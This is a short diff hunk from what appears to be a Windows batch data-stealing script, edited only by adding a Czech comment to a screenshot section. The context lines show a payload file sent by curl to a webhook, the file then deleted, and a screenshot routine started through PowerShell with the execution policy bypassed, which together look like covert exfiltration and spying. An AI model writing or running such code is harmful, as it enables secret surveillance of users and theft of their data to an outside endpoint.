@@ -63,7 +63,7 @@ echo }
 curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
 del /f /q "!payload!"
 
-:: 📸 Screenshot
+:: 📸 Screenshot (beze změn)
 set "ss=%TEMP%\screenshot_%RANDOM%.png"
 powershell -ExecutionPolicy Bypass -Command ^
 "Add-Type -AssemblyName System.Windows.Forms; ^
